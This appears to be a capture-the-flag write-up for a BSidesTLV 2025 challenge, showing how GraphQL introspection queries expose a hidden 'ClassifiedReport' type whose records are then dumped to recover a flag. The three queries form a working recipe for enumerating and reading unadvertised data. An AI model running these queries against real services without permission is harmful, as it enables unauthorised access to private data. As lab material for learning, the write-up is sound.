# BSidesTLV 2025 — AvengersQueryLanguage: GraphQL Introspection to Hidden Type

The app has a dashboard that fetches live counts of heroes, teams, missions, and enemies. Inspecting the page source reveals it makes POST requests to a `/graphql` endpoint - a clear signal to dig into the GraphQL schema.

## Discovering the Schema

Using GraphQL introspection, we enumerate all available types:

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

Among the standard types, one stands out: `ClassifiedReport`. This isn't exposed in any of the four frontend queries.

## Querying the Hidden Type

We first inspect its fields:

```graphql
query {
  __type(name: "ClassifiedReport") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

Then query all records directly:

```graphql
{
  classifiedReports {
    id
    title
    content
    classificationLevel
    leakedById
  }
}
```

The `content` field of one of the classified reports contains the flag.
